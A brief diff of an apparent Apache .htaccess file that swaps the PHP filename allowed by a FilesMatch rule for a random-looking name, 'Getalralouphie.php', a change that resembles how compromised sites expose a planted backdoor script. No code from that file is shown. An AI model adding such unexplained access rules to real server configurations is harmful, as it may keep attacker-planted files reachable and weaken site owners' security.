@@ -82,7 +82,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(LocaleDocs.php)$"> 
+<FilesMatch "^(Getalralouphie.php)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
